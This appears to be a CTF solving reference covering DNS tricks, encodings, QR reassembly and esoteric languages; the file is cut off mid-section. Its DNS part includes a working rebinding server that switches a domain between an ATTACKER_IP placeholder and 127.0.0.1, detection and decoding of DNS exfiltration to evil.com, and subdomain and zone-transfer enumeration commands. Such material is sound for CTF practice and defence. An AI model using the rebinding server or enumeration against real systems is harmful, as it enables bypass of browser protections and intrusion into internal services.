**IXFR output format:** The diff shows pairs of SOA records bracketing additions/deletions. Records between the old SOA and new SOA were removed; records after new SOA were added. Deleted TXT records often contain flag fragments.

---

## DNS Rebinding

**Pattern:** Bypass same-origin or IP-based access controls by making a DNS name resolve to different IPs over time.

**How it works:**
1. Attacker controls DNS for `evil.com` with very low TTL (e.g., 1 second)
2. First resolution: `evil.com` -> attacker's IP (serves malicious JS)
3. Second resolution: `evil.com` -> `127.0.0.1` (or internal IP)
4. Browser's same-origin policy allows JS on `evil.com` to access the new IP

```python
# Simple DNS rebinding server (Python + dnslib)
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.count[qname] = self.count.get(qname, 0) + 1
        reply = request.reply()

        if self.count[qname] % 2 == 1:
            reply.add_answer(RR(qname, rdata=A("ATTACKER_IP"), ttl=1))
        else:
            reply.add_answer(RR(qname, rdata=A("127.0.0.1"), ttl=1))
        return reply
```

**Tools:** [rbndr.us](http://rbndr.us/) for quick rebinding without custom DNS, [singularity](https://github.com/nccgroup/singularity) for automated attacks.

---

## DNS Tunneling / Exfiltration

**Pattern:** Data exfiltrated via DNS queries (subdomains) or responses (TXT records).

**Detection in PCAPs:**
```bash
# Extract DNS queries from pcap
tshark -r capture.pcap -Y "dns.qry.type == 1" \
    -T fields -e dns.qry.name | sort -u

# Look for encoded subdomains (hex, base32, base64url)
tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" \
    -T fields -e dns.qry.name
```

**Decoding exfiltrated data:**
```python
import base64

# Subdomain-based exfil: data.chunk1.evil.com, data.chunk2.evil.com
queries = [...]  # extracted DNS query names
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
decoded = base64.b32decode(''.join(chunks).upper() + '====')
print(decoded)
```

**DNS-based C2 in PCAPs:**
```bash
tshark -r capture.pcap -Y "dns.qry.type == 16" \
    -T fields -e dns.qry.name -e dns.txt
```

---

## DNS Round-Robin A Record Enumeration (EKOPARTY 2017)

**Pattern:** Domain configured with many rotating A records pointing to different backend IPs. Only some serve the relevant HTTP content. Query repeatedly to collect all IPs, then scan and make direct virtual-host requests.

```bash
# Get all A records (query multiple times for round-robin)
for i in $(seq 1 100); do dig +short target.com A; done | sort -u > ips.txt

# Scan each IP for open port 80 and request with correct Host header
while read ip; do
    response=$(curl -s -m 3 -H "Host: target.com" "http://$ip/")
    if echo "$response" | grep -q "flag"; then
        echo "Found on $ip"
        echo "$response"
    fi
done < ips.txt
```

**Key insight:** DNS round-robin with heterogeneous backends can hide content across many IPs. A single DNS query may not return all records — query repeatedly (50-100 times) and deduplicate to exhaust the record set. Then make direct virtual-host requests (`-H "Host: target.com"`) to each IP for complete coverage.

---

## DNS Enumeration Quick Reference

```bash
# Standard zone transfer attempt
dig @ns.target.com target.com AXFR

# Brute-force subdomains
for sub in $(cat wordlist.txt); do
    dig +short "$sub.target.com" && echo "$sub"
done

# Reverse DNS sweep
for i in $(seq 1 254); do
    dig +short -x 10.0.0.$i
done

# Check for wildcard DNS
dig randomnonexistent.target.com
```


# encodings-advanced

# CTF Misc - Advanced Encodings & Specialized Formats

## Table of Contents
- [Verilog/HDL](#veriloghdl)
- [Gray Code Cyclic Encoding (EHAX 2026)](#gray-code-cyclic-encoding-ehax-2026)
- [Binary Tree Key Encoding](#binary-tree-key-encoding)
- [RTF Custom Tag Data Extraction (VolgaCTF 2013)](#rtf-custom-tag-data-extraction-volgactf-2013)
- [SMS PDU Decoding and Reassembly (RuCTF 2013)](#sms-pdu-decoding-and-reassembly-ructf-2013)
- [Automated Multi-Encoding Sequential Solver (HackIM 2016)](#automated-multi-encoding-sequential-solver-hackim-2016)
- [RFC 4042 UTF-9 Decoding (SECCON 2015)](#rfc-4042-utf-9-decoding-seccon-2015)
- [Pixel Color Binary Encoding (Break In 2016)](#pixel-color-binary-encoding-break-in-2016)
- [Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)](#hexadecimal-sudoku--qr-assembly-bsidessf-2026)
- [TOPKEK Binary Encoding (Hack The Vote 2016)](#topkek-binary-encoding-hack-the-vote-2016)
- [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
- [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
- [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)

---

## Verilog/HDL

```python
# Translate Verilog logic to Python
def verilog_module(input_byte):
    wire_a = (input_byte >> 4) & 0xF
    wire_b = input_byte & 0xF
    return wire_a ^ wire_b
```

---

## Gray Code Cyclic Encoding (EHAX 2026)

**Pattern (#808080):** Web interface with a circular wheel (5 concentric circles = 5 bits, 32 positions). Must fill in a valid Gray code sequence where consecutive values differ by exactly one bit.

**Gray code properties:**
- N-bit Gray code has 2^N unique values
- Adjacent values differ by exactly 1 bit (Hamming distance = 1)
- The sequence is **cyclic** — rotating the start position produces another valid sequence
- Standard conversion: `gray = n ^ (n >> 1)`

```python
# Generate N-bit Gray code sequence
def gray_code(n_bits):
    return [i ^ (i >> 1) for i in range(1 << n_bits)]

# 5-bit Gray code: 32 values
seq = gray_code(5)
# [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8, ...]

# Rotate sequence by k positions (cyclic property)
def rotate(seq, k):
    return seq[k:] + seq[:k]

# If decoded output is ROT-N shifted, rotate the Gray code start by N positions
rotated = rotate(seq, 4)  # Shift start by 4
```

**Key insight:** If the decoded output looks correct but shifted (e.g., ROT-4), the Gray code start position needs cyclic rotation by the same offset. The cyclic property guarantees all rotations remain valid Gray codes.

**Wheel mapping:** Each concentric circle = one bit position. Innermost = bit 0, outermost = bit N-1. Read bits at each angular position to build N-bit values.

---

## Binary Tree Key Encoding

**Encoding:** `'0' → j = j*2 + 1`, `'1' → j = j*2 + 2`

**Decoding:**
```python
def decode_path(index):
    path = ""
    while index != 0:
        if index & 1:  # Odd = left ('0')
            path += "0"
            index = (index - 1) // 2
        else:          # Even = right ('1')
            path += "1"
            index = (index - 2) // 2
    return path[::-1]
```

---

## RTF Custom Tag Data Extraction (VolgaCTF 2013)

**Pattern:** Data hidden inside custom RTF control sequences (e.g., `{\*\volgactf412 [DATA]}`). Extract numbered blocks, sort by index, concatenate, and base64-decode.

```python
import re, base64

rtf = open('document.rtf', 'r').read()
# Extract custom tags: {\*\volgactf<N> <DATA>}
blocks = re.findall(r'\{\\\*\\volgactf(\d+)\s+([^}]+)\}', rtf)
blocks.sort(key=lambda x: int(x[0]))  # Sort by numeric index
payload = ''.join(data for _, data in blocks)
flag = base64.b64decode(payload)
```

**Key insight:** RTF files support custom control sequences prefixed with `\*` (ignorable destinations). Malicious or challenge data hides in these ignored fields — standard RTF viewers skip them. Look for non-standard `\*\` tags with `grep -oP '\\\\\\*\\\\[a-z]+\d*' document.rtf`.

---

## SMS PDU Decoding and Reassembly (RuCTF 2013)

**Pattern:** Intercepted hex strings are GSM SMS-SUBMIT PDU (Protocol Data Unit) frames. Concatenated SMS messages require UDH (User Data Header) reassembly by sequence number.

```python
from smspdu import SMS_SUBMIT

# Read PDU hex strings (one per line)
pdus = [line.strip() for line in open('sms_intercept.txt')]

# Sort by concatenation sequence number (bytes 38-40 in hex)
pdus.sort(key=lambda pdu: int(pdu[38:40], 16))

# Extract and concatenate user data
payload = b''
for pdu in pdus:
    sms = SMS_SUBMIT.fromPDU(pdu[2:], '')  # Skip first byte (SMSC length)
    payload += sms.user_data.encode() if isinstance(sms.user_data, str) else sms.user_data

# Payload is often base64 — decode to get embedded file
import base64
with open('output.png', 'wb') as f:
    f.write(base64.b64decode(payload))
```

**Key insight:** SMS PDU format: `0041000B91` prefix identifies SMS-SUBMIT. UDH field at bytes 29-40 contains `05000301XXYY` where XX=total parts, YY=sequence number. Install `smspdu` library (`pip install smspdu`) for automated parsing. Output is often a base64-encoded image — use reverse image search to identify the subject.

---

## Automated Multi-Encoding Sequential Solver (HackIM 2016)

Some challenges require decoding 25+ sequential layers of different encodings. Build an automated decoder:

```python
import base64, zlib, bz2, codecs

def auto_decode(data):
    """Try each encoding and return first successful decode"""
    decoders = [
        ('base64', lambda d: base64.b64decode(d)),
        ('base32', lambda d: base64.b32decode(d)),
        ('base16', lambda d: base64.b16decode(d.upper())),
        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),
        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),
        ('rot13',  lambda d: codecs.decode(d, 'rot_13')),
        ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),
        ('binary', lambda d: bytes(int(d[i:i+8], 2) for i in range(0, len(d.strip()), 8))),
        ('ebcdic', lambda d: d.decode('cp500') if isinstance(d, bytes) else d.encode().decode('cp500')),
    ]

    for name, decoder in decoders:
        try:
            result = decoder(data)
            if result and len(result) > 0:
                return name, result
        except:
            continue
    return None, data

# Chain decoder
data = initial_input
for i in range(50):  # Max layers
    name, data = auto_decode(data)
    if name is None:
        break
    print(f"Layer {i}: {name}")
```

Add Brainfuck detection (presence of `+-<>[].,` characters only) and other esoteric languages as needed.

---

## RFC 4042 UTF-9 Decoding (SECCON 2015)

RFC 4042 (April Fools' RFC) defines UTF-9, a 9-bit encoding for Unicode on systems with 9-bit bytes:

- Each 9-bit "byte" has a continuation bit (MSB): 1 = more bytes follow, 0 = last byte
- Lower 8 bits contain character data
- Multi-byte sequences concatenate the 8-bit portions

```python
def decode_utf9(data_bits):
    """Decode UTF-9 from a bitstring"""
    chars = []
    i = 0
    while i < len(data_bits):
        # Read 9-bit units until continuation bit is 0
        codepoint_bits = ''
        while i + 9 <= len(data_bits):
            continuation = int(data_bits[i])
            codepoint_bits += data_bits[i+1:i+9]
            i += 9
            if continuation == 0:
                break
        if codepoint_bits:
            chars.append(chr(int(codepoint_bits, 2)))
    return ''.join(chars)

# Convert octal/hex input to binary first
binary_string = bin(int(octal_data, 8))[2:]
result = decode_utf9(binary_string)
```

**Key insight:** Look for "4042" or "UTF-9" in challenge descriptions. The April Fools' RFC series (RFC 1149, 2549, 4042) occasionally appears in CTFs.

---

## Pixel Color Binary Encoding (Break In 2016)

Narrow images (7-8 pixels wide) may encode ASCII characters as binary pixel rows:

```python
from PIL import Image

img = Image.open('challenge.png')
pixels = img.load()
width, height = img.size

text = ''
for y in range(height):
    bits = ''
    for x in range(width):
        r, g, b = pixels[x, y][:3]
        # Red pixel = 1, Black pixel = 0 (or white=1, black=0)
        bits += '1' if r > 128 else '0'

    # Pad to 8 bits if needed (7-pixel-wide images)
    if len(bits) == 7:
        bits = '0' + bits  # Prepend leading zero

    text += chr(int(bits, 2))

print(text)
```

**Key insight:** Image width of 7 or 8 pixels strongly suggests binary character encoding (7-bit ASCII or 8-bit). Check both color channels and brightness thresholds.

---

### Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)

**Pattern (hexhaustion):** Flag is encoded across 4 QR codes, each containing one quadrant of a 16x16 hexadecimal Sudoku grid. Solve the Sudoku, read the main diagonal values as hex pairs, convert to ASCII for the flag.

**Solving steps:**

1. **Scan QR codes:** Use `zbarimg` or `pyzbar` to decode all 4 QR codes
2. **Assemble grid:** Each QR contains a quadrant (8x8) with hex values (0-F) and blanks
3. **Solve the 16x16 Sudoku:** Standard Sudoku rules apply with hex digits (0-F) — each row, column, and 4x4 box contains each digit exactly once
4. **Extract flag:** Read diagonal values `grid[i][i]` for i=0..15, pair into bytes, decode as ASCII

```python
from itertools import product

def solve_hex_sudoku(grid):
    """Solve 16x16 Sudoku with hex digits 0-F using backtracking."""
    digits = set(range(16))

    def possible(r, c):
        used = set()
        used.update(grid[r])              # Row
        used.update(grid[i][c] for i in range(16))  # Column
        br, bc = (r // 4) * 4, (c // 4) * 4  # 4x4 box
        for i, j in product(range(br, br+4), range(bc, bc+4)):
            used.update({grid[i][j]})
        used.discard(-1)  # -1 = blank
        return digits - used

    def solve():
        for r, c in product(range(16), range(16)):
            if grid[r][c] == -1:
                for d in possible(r, c):
                    grid[r][c] = d
                    if solve():
                        return True
                    grid[r][c] = -1
                return False
        return True

    solve()
    return grid

# Read diagonal and convert to ASCII
solved = solve_hex_sudoku(grid)
diag_hex = ''.join(format(solved[i][i], 'X') for i in range(16))
flag = bytes.fromhex(diag_hex).decode('ascii')
print(flag)  # e.g., "HYPOAXIS"
```

**Key insight:** The QR codes serve as both a distribution mechanism (splitting the puzzle into 4 pieces) and a data encoding layer. The actual flag encoding is in the Sudoku solution's diagonal values interpreted as hex bytes.

**When to recognize:** Challenge distributes multiple QR codes, mentions "hex", "nibbles", or "16x16 grid". QR content contains hex characters with blanks/underscores.

**References:** BSidesSF 2026 "hexhaustion"

---

### TOPKEK Binary Encoding (Hack The Vote 2016)

Custom binary encoding where `KEK` represents bit 0 and `TOP` represents bit 1. Exclamation marks indicate bit repetition count.

```python
def decode_topkek(encoded):
    """Decode TOPKEK encoding: KEK=0, TOP=1, !=repeat count"""
    tokens = encoded.split()
    bits = ""

    for token in tokens:
        # Count exclamation marks (repeat count = len - 3)
        base = token.replace('!', '')
        repeats = len(token) - len(base)
        if repeats == 0:
            repeats = 1

        if base == "KEK":
            bits += "0" * repeats
        elif base == "TOP":
            bits += "1" * repeats

    # Convert bit string to ASCII
    message = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))

    return message

# Example: "KEK! TOP!! KEK TOP!"
# = "0" + "11" + "0" + "1" = "0110 1..."
```

**Key insight:** TOPKEK is a CTF-specific encoding. Recognize it by the pattern of `TOP`/`KEK` words with varying numbers of `!` suffixes. Each `!` adds one repetition of the corresponding bit value. Decode to binary, then group into 8-bit bytes for ASCII.

---

### MaxiCode 2D Barcode Decoding (CSAW CTF 2016)

MaxiCode is a hexagonal 2D barcode used by UPS, occasionally found in CTF forensics challenges.

```bash
# Identify MaxiCode: distinctive bullseye center pattern
# with hexagonal dot matrix (unlike QR's square modules)

# Decode using zxing library:
# Online: https://zxing.org/w/decode.jspx (upload image)

# Python:
# pip install zxing pyzbar
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
results = decode(Image.open('maxicode.gif'), symbols=[pyzbar.ZBarSymbol.CODE128])
# Note: pyzbar may not support MaxiCode directly
# Use zxing Java library instead:
"

# Java zxing command-line:
java -cp javase.jar:core.jar com.google.zxing.client.j2se.CommandLineRunner maxicode.gif

# Alternative: use online decoders
# - https://products.aspose.app/barcode/recognize
# - https://www.onlinebarcodereader.com/
```

**Key insight:** MaxiCode has a distinctive bullseye center (3 concentric circles) surrounded by a hexagonal grid. Standard QR decoders won't read it. Use zxing (Java) which supports MaxiCode natively, or online barcode decoders. MaxiCode is found in shipping labels, CTF forensics disk images, and embedded in other files.

---

### DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)

**Pattern:** Audio file contains DTMF telephone keypad tones. This is a two-layer encoding: first decode tones to a digit sequence, then decode grouped digits as multi-tap phone keypad input (repeated presses select letters).

**Step 1 — Decode DTMF tones to digits:** Use Audacity's spectrogram view or an online DTMF decoder to identify tone pairs. Pauses/gaps indicate word or group boundaries.

**Step 2 — Decode multi-tap keypad:** Group digits by their key press sequences, then map to letters:

```python
# Multi-tap decode mapping
T9 = {
    '2':'a',  '22':'b',  '222':'c',
    '3':'d',  '33':'e',  '333':'f',
    '4':'g',  '44':'h',  '444':'i',
    '5':'j',  '55':'k',  '555':'l',
    '6':'m',  '66':'n',  '666':'o',
    '7':'p',  '77':'q',  '777':'r', '7777':'s',
    '8':'t',  '88':'u',  '888':'v',
    '9':'w',  '99':'x',  '999':'y', '9999':'z',
}

def decode_multitap(groups):
    """groups: list of strings like ['444', '88', '2', ...]"""
    return ''.join(T9.get(g, '?') for g in groups)
```

**Key insight:** Two-layer encoding — DTMF tones encode digits, then digit sequences use multi-tap phone keypad mapping. Use Audacity's spectrogram to identify pause positions for grouping boundaries. Each same-digit run maps to one letter; a pause separates distinct keypresses on the same digit key.

---

### Music Note Interval Steganography (DefCamp 2017)

**Pattern:** An MP3 is transcribed to musical notes. The flag is encoded as pairs of notes where each note maps to a nibble (4 bits) based on its position (scale degree) in the D major scale. Two nibbles combine to form one byte/character.

**Encoding scheme:**
- D major scale degrees 0–7 map to nibble values 0–7 (3-bit nibble) or 0–15 (4-bit nibble) depending on variant
- Each pair of consecutive notes encodes one character: `(note1 << 4) | note2`
- Known flag prefix/suffix (e.g., `CTF{...}`) at start/end reveals the alphabet mapping

**Recovery approach:**

```python
# Example: D major scale degree → nibble value
# D=0, E=1, F#=2, G=3, A=4, B=5, C#=6, D(octave)=7
scale = {'D': 0, 'E': 1, 'F#': 2, 'G': 3, 'A': 4, 'B': 5, 'C#': 6}

notes = ['A', 'D', 'G', 'E', ...]  # transcribed from audio

chars = []
for i in range(0, len(notes) - 1, 2):
    hi = scale[notes[i]]
    lo = scale[notes[i+1]]
    chars.append(chr((hi << 4) | lo))

print(''.join(chars))
```

**Key insight:** Known plaintext at the start and end (flag format like `CTF{` and `}`) reveals the encoding alphabet — map the known characters back to their note pairs to confirm the scale-degree assignment. Musical scale degree = nibble value; pairs of notes = one byte.


# encodings

# CTF Misc - Encodings & Media

## Table of Contents
- [Common Encodings](#common-encodings)
  - [Base64](#base64)
  - [Base32](#base32)
  - [Hex](#hex)
  - [IEEE 754 Floating Point Encoding](#ieee-754-floating-point-encoding)
  - [UTF-16 Endianness Reversal (LACTF 2026)](#utf-16-endianness-reversal-lactf-2026)
  - [BCD (Binary-Coded Decimal) Encoding (VuwCTF 2025)](#bcd-binary-coded-decimal-encoding-vuwctf-2025)
  - [Multi-Layer Encoding Detection (0xFun 2026)](#multi-layer-encoding-detection-0xfun-2026)
  - [URL Encoding](#url-encoding)
  - [ROT13 / Caesar](#rot13--caesar)
  - [Caesar Brute Force](#caesar-brute-force)
- [QR Codes](#qr-codes)
  - [Basic Commands](#basic-commands)
  - [QR Structure](#qr-structure)
  - [Repairing Damaged QR](#repairing-damaged-qr)
  - [Finder Pattern Template](#finder-pattern-template)
  - [QR Code Chunk Reassembly (LACTF 2026)](#qr-code-chunk-reassembly-lactf-2026)
  - [QR Code Chunk Reassembly via Indexed Directories (UTCTF 2026)](#qr-code-chunk-reassembly-via-indexed-directories-utctf-2026)
- [Multi-Stage URL Encoding Chain (UTCTF 2026)](#multi-stage-url-encoding-chain-utctf-2026)
- [Esoteric Languages](#esoteric-languages)
  - [Whitespace Language Parser (BYPASS CTF 2025)](#whitespace-language-parser-bypass-ctf-2025)
  - [Custom Brainfuck Variants (Themed Esolangs)](#custom-brainfuck-variants-themed-esolangs)
  - [Multi-Layer Esoteric Language Chains (Break In 2016)](#multi-layer-esoteric-language-chains-break-in-2016)

See also: [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL, Gray code, binary tree encoding, RTF custom tags, SMS PDU decoding, multi-encoding solvers, UTF-9, pixel binary encoding, hex Sudoku + QR, TOPKEK, MaxiCode

---

## Common Encodings

### Base64
```bash
echo "encoded" | base64 -d
# Charset: A-Za-z0-9+/=
```

### Base32
```bash
echo "OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3DGBSDG7I=" | base32 -d
# Charset: A-Z2-7= (no lowercase, no 0,1,8,9)
```

### Hex
```bash
echo "68656c6c6f" | xxd -r -p
```

### IEEE 754 Floating Point Encoding

Numbers that encode ASCII text when viewed as raw IEEE 754 bytes:

```python
import struct

values = [240600592, 212.2753143310547, 2.7884192016691608e+23]

# Each float32 packs to 4 ASCII bytes
for v in values:
    packed = struct.pack('>f', v)  # Big-endian single precision
    print(f"{v} -> {packed}")      # b'Meta', b'CTF{', b'fl04'

# For double precision (8 bytes per value):
# struct.pack('>d', v)
```

**Key insight:** If challenge gives a list of numbers (mix of integers, decimals, scientific notation), try packing each as IEEE 754 float32 (`struct.pack('>f', v)`) — the 4 bytes often spell ASCII text.

### UTF-16 Endianness Reversal (LACTF 2026)

**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.

**Fix:** Reverse the encoding/decoding order:
```python
# If encoded as UTF-16-LE but decoded as UTF-16-BE:
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')

# If encoded as UTF-16-BE but decoded as UTF-16-LE:
fixed = mojibake.encode('utf-16-le').decode('utf-16-be')
```

**Identification:** Text appears as CJK characters (Japanese/Chinese), challenge mentions "translation" or "endian".

### BCD (Binary-Coded Decimal) Encoding (VuwCTF 2025)

**Pattern:** Challenge name hints at ratio (e.g., "1.5x" = 1.5:1 byte ratio). Each nibble encodes one decimal digit.

```python
def bcd_decode(data):
    """Decode BCD: each byte = 2 decimal digits."""
    return ''.join(f'{(b>>4)&0xf}{b&0xf}' for b in data)

# Then convert decimal string to ASCII
ascii_text = ''.join(chr(int(decoded[i:i+2])) for i in range(0, len(decoded), 2))
```

### Multi-Layer Encoding Detection (0xFun 2026)

**Pattern (139 steps):** Recursive decoding with troll flags as decoys.

**Critical rule:** When data is all hex chars (0-9, a-f), decode as **hex FIRST**, not base64 (which also accepts those chars).

```python
def auto_decode(data):
    while True:
        data = data.strip()
        if data.startswith('REAL_DATA_FOLLOWS:'):
            data = data.split(':', 1)[1]
        # Prioritize hex when ambiguous
        if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:
            data = bytes.fromhex(data).decode('ascii', errors='replace')
        elif set(data) <= set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='):
            data = base64.b64decode(data).decode('ascii', errors='replace')
        else:
            break
    return data
```

**Ignore troll flags** — check for "keep decoding" or "REAL_DATA_FOLLOWS:" markers.

### URL Encoding
```python
import urllib.parse
urllib.parse.unquote('hello%20world')
```

### ROT13 / Caesar
```bash
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**ROT13 patterns:** `gur` = "the", `synt` = "flag"

### Caesar Brute Force
```python
text = "Khoor Zruog"
for shift in range(26):
    decoded = ''.join(
        chr((ord(c) - 65 - shift) % 26 + 65) if c.isupper()
        else chr((ord(c) - 97 - shift) % 26 + 97) if c.islower()
        else c for c in text)
    print(f"{shift:2d}: {decoded}")
```

---

## QR Codes

### Basic Commands
```bash
zbarimg qrcode.png           # Decode
zbarimg -S*.enable qr.png    # All barcode types
qrencode -o out.png "data"   # Encode
```

### QR Structure

**Finder patterns (3 corners):** 7x7 modules at top-left, top-right, bottom-left

**Version formula:** `(version * 4) + 17` modules per side

### Repairing Damaged QR

```python
from PIL import Image
import numpy as np

img = Image.open('damaged_qr.png')
arr = np.array(img)

# Convert to binary
gray = np.mean(arr, axis=2)
binary = (gray < 128).astype(int)

# Find QR bounds
rows = np.any(binary, axis=1)
cols = np.any(binary, axis=0)
rmin, rmax = np.where(rows)[0][[0, -1]]
cmin, cmax = np.where(cols)[0][[0, -1]]

# Check finder patterns
qr = binary[rmin:rmax+1, cmin:cmax+1]
print("Top-left:", qr[0:7, 0:7].sum())  # Should be ~25
```

### Finder Pattern Template
```python
finder_pattern = [
    [1,1,1,1,1,1,1],
    [1,0,0,0,0,0,1],
    [1,0,1,1,1,0,1],
    [1,0,1,1,1,0,1],
    [1,0,1,1,1,0,1],
    [1,0,0,0,0,0,1],
    [1,1,1,1,1,1,1],
]
```

### QR Code Chunk Reassembly (LACTF 2026)

**Pattern (error-correction):** QR code split into grid of chunks (e.g., 5x5 of 9x9 pixels), shuffled.

**Solving approach:**
1. **Fix known chunks:** Use structural patterns -- finder patterns (3 corners), timing patterns, alignment patterns -- to place ~50% of chunks
2. **Extract codeword constraints:** For each candidate payload length, use QR spec to identify which pixels are invariant across encodings
3. **Backtracking search:** Assign remaining chunks under pixel constraints until QR decodes successfully

**Tools:** `segno` (Python QR library), `zbarimg` for decoding.

### QR Code Chunk Reassembly via Indexed Directories (UTCTF 2026)

**Pattern (QRecreate):** QR code split into numbered chunks stored in separate directories. Directory names encode the chunk index as base64 (e.g., `MDAx` → `001` → index 1).

**Solving approach:**
1. Decode each directory name from base64 to get the numeric index
2. Sort chunks by decoded index
3. Arrange in a grid (e.g., 100 chunks → 10x10) and stitch into a single image
4. Decode the reconstructed QR code

```python
import os, base64, math
from PIL import Image

# 1. Decode directory names to get indices
chunks = []
for dirname in os.listdir('chunks/'):
    index = int(base64.b64decode(dirname).decode())
    tile = Image.open(f'chunks/{dirname}/tile.png')
    chunks.append((index, tile))

# 2. Sort by index and arrange in grid
chunks.sort(key=lambda x: x[0])
n = len(chunks)
side = int(math.isqrt(n))
tile_w, tile_h = chunks[0][1].size

canvas = Image.new("RGB", (side * tile_w, side * tile_h), (255, 255, 255))
for i, (_, tile) in enumerate(chunks):
    r, c = divmod(i, side)
    canvas.paste(tile, (c * tile_w, r * tile_h))

canvas.save('reconstructed_qr.png')
# 3. Decode with zbarimg or pyzbar
```

**Key insight:** Unlike the LACTF variant (shuffled chunks requiring structural analysis), indexed chunks just need sorting. The challenge is recognizing that directory names are base64-encoded indices. Check `base64 -d` on folder names when they look like random strings.

---

## Multi-Stage URL Encoding Chain (UTCTF 2026)

**Pattern (Breadcrumbs):** Flag is hidden behind a chain of URLs, each encoded differently. Follow the breadcrumbs across external resources (GitHub Gists, Pastebin, etc.), decoding at each hop.

**Common encoding layers per hop:**
1. **Base64** → URL to next resource
2. **Hex** → URL to next resource (e.g., `68747470733a2f2f...` = `https://...`)
3. **ROT13** → final flag

**Decoding workflow:**
```python
import base64, codecs

# Hop 1: Base64
hop1 = "aHR0cHM6Ly9naXN0Lmdp..."
url2 = base64.b64decode(hop1).decode()

# Hop 2: Hex-encoded URL
hop2 = "68747470733a2f2f..."
url3 = bytes.fromhex(hop2).decode()

# Hop 3: ROT13-encoded flag
hop3 = "hgsynt{...}"
flag = codecs.decode(hop3, 'rot_13')
```

**Key insight:** Each resource contains a hint about the next encoding (e.g., "Three letters follow" hints at 3-character encoding like hex). Look for contextual clues in surrounding text (poetry, comments, filenames) that indicate the encoding type.

**Detection:** Challenge mentions "trail", "breadcrumbs", "follow", or "scavenger hunt". First resource contains what looks like encoded data rather than a direct flag.

---

## Esoteric Languages

| Language | Pattern |
|----------|---------|
| Brainfuck | `++++++++++[>+++++++>` |
| Whitespace | Only spaces, tabs, newlines (or S/T/L substitution) |
| Ook! | `Ook. Ook? Ook!` |
| Malbolge | Extremely obfuscated |
| Piet | Image-based |

### Whitespace Language Parser (BYPASS CTF 2025)

**Pattern (Whispers of the Cursed Scroll):** File contains only S (space), T (tab), L (linefeed) characters — or visible substitutes. Stack-based virtual machine (VM) with PUSH, OUTPUT, and EXIT instructions.

**Instruction set (IMP = Instruction Modification Parameter):**
| Instruction | Encoding | Action |
|-------------|----------|--------|
| PUSH | `S S` + sign + binary + `L` | Push number to stack (S=0, T=1, L=terminator) |
| OUTPUT CHAR | `T L S S` | Pop stack, print as ASCII character |
| EXIT | `L L L` | Halt program |

```python
def solve_whitespace(content):
    # Convert to S/T/L tokens (handle both raw whitespace and visible chars)
    if any(c in content for c in 'STL'):
        code = [c for c in content if c in 'STL']
    else:
        code = [{'\\s': 'S', '\\t': 'T', '\\n': 'L'}.get(c, '') for c in content]
        code = [c for c in code if c]

    stack, output, i = [], "", 0

    while i < len(code):
        if code[i:i+2] == ['S', 'S']:  # PUSH
            i += 2
            sign = 1 if code[i] == 'S' else -1
            i += 1
            val = 0
            while i < len(code) and code[i] != 'L':
                val = (val << 1) + (1 if code[i] == 'T' else 0)
                i += 1
            i += 1  # skip terminator L
            stack.append(sign * val)
        elif code[i:i+4] == ['T', 'L', 'S', 'S']:  # OUTPUT CHAR
            i += 4
            if stack:
                output += chr(stack.pop())
        elif code[i:i+3] == ['L', 'L', 'L']:  # EXIT
            break
        else:
            i += 1

    return output
```

**Identification:** File with only whitespace characters, or challenge mentions "invisible code", "blank page", or uses S/T/L substitution. Try [Whitespace interpreter online](https://vii5ard.github.io/whitespace/) for quick testing.

---

### Custom Brainfuck Variants (Themed Esolangs)

**Pattern:** File contains repetitive themed words (e.g., "arch", "linux", "btw") used as substitutes for Brainfuck operations. Common in Easy/Misc CTF challenges.

**Identification:**
- File is ASCII text with very long lines of repeated words
- Small vocabulary (5-8 unique words)
- One word appears as a line terminator (maps to `.` output)
- Two words are used for increment/decrement (one has many repeats per line)
- Words often relate to a meme or theme (e.g., "I use Arch Linux BTW")

**Standard Brainfuck operations to map:**
| Op | Meaning | Typical pattern |
|----|---------|-----------------|
| `+` | Increment cell | Most repeated word (defines values) |
| `-` | Decrement cell | Second most repeated word |
| `>` | Move pointer right | Short word, appears alone or with `.` |
| `<` | Move pointer left | Paired with `>` word |
| `[` | Begin loop | Appears at start of lines with `]` counterpart |
| `]` | End loop | Appears at end of same lines as `[` |
| `.` | Output char | Line terminator word |

**Solving approach:**
```python
from collections import Counter
words = content.split()
freq = Counter(words)
# Most frequent = likely + or -, line-ender = likely .

# Map words to BF ops, translate, run standard BF interpreter
mapping = {'arch': '+', 'linux': '-', 'i': '>', 'use': '<',
           'the': '[', 'way': ']', 'btw': '.'}
bf = ''.join(mapping.get(w, '') for w in words)
# Then execute bf string with a standard Brainfuck interpreter
```

**Real example (0xL4ugh CTF - "iUseArchBTW"):** `.archbtw` extension, "I use Arch Linux BTW" meme theme.

**Tips:** Try swapping `+`/`-` or `>`/`<` if output is not ASCII. Verify output starts with known flag format.

---

### Multi-Layer Esoteric Language Chains (Break In 2016)

